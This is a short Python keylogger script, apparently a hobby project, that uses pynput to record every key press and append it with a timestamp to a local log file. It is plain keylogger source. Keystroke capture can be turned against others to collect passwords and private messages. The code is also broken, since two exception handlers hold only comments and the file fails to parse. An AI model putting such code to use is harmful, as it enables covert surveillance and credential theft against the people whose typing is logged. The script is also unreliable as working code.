from pynput import keyboard
import datetime
def keyPressed(key):
    #print(str(key))
    with open("C:/Users/imclp/OneDrive/Desktop/keylogger project/log.txt",'a') as logKey:
        try:
            ks = str(key)
            logKey.write(ks)
            logKey.write(",")
        except:
            #print("Error getting char")



if __name__ == "__main__":
    with open("C:/Users/imclp/OneDrive/Desktop/keylogger project/log.txt",'a') as file:
        try:
            file.write("\n")
            file.write(str(datetime.datetime.now()))
            file.close()
        except:
            #print("datetime error")
    listner = keyboard.Listener(on_press = keyPressed)
    listner.start()
    input()